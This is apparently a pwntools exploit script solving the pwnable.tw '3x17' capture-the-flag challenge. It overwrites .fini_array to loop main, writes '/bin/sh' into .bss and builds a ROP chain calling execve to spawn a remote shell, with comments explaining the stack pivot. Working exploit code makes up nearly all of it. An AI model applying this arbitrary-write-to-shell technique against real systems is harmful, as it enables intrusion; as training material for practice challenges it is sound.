from pwn import *

# r = process('./3x17')
r = remote('chall.pwnable.tw', 10105)

pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rdx = 0x446e35
pop_rax = 0x41e4af
syscall = 0x4022b4
fini_array = 0x4b40f0
fini_array_caller = 0x402960
blank_space_bss = 0x4b9370    # store "/bin/sh"
leave_ret = 0x401c4b
main = 0x401b6d

# gdb.attach(r, "b *0x401b6d")
def overwrite(addr, data):
    r.sendlineafter('r:', str(addr))
    r.sendafter('a:', data)

def solve():
    # create loop in fini_array
    overwrite(fini_array, p64(fini_array_caller) + p64(main))
    # write "/bin/sh" to blank space in .bss
    overwrite(blank_space_bss, "/bin/sh\x00")
    # ROP
    overwrite(fini_array+2*8, p64(pop_rdi))
    overwrite(fini_array+3*8, p64(blank_space_bss)) 
    overwrite(fini_array+4*8, p64(pop_rsi))
    overwrite(fini_array+5*8, p64(0))
    overwrite(fini_array+6*8, p64(pop_rdx))
    overwrite(fini_array+7*8, p64(0))
    overwrite(fini_array+8*8, p64(pop_rax)) 
    overwrite(fini_array+9*8, p64(0x3b)) # syscall shell
    overwrite(fini_array+10*8, p64(syscall))
    overwrite(fini_array, p64(leave_ret) + p64(main)) 
    r.interactive()

"""
In main, there is a global value, it +=1 its value and check if it == 1 or not. If it == 1, read addr, data. If not, return (leave, retn)
So when we loop through fini_array, the flow is: main -> fini_array_caller -> fini_array[1](main) -> fini_array[0](fini_array_caller) ==> infinity loop
each loop, it will +=1 the global value. Luckily, that value is small (256) so that it will be overflowed to 1 => main read, data.
when we write all the rop chain needed, write fini_array[0] with leave_ret 
in fini_array_caller, rbp is the address of fini_array, so that leave_ret will set esp to the fini_array+8. 
After that we jump to main, that global value is not equal to 1 => it will return (leave_ret) => leave_ret in fucntion equal a ret gadget outside function => eip = fini_array+16 => jump to rop chain
"""
if __name__ == '__main__':
    solve()

"""
notes:
_ control ebp with leave_ret
_ fini_array

Step:
_ create infinite loop
_ craft rop chain in fini_array
_ set rbp to finiarray + 2*8 where we store rop chain
"""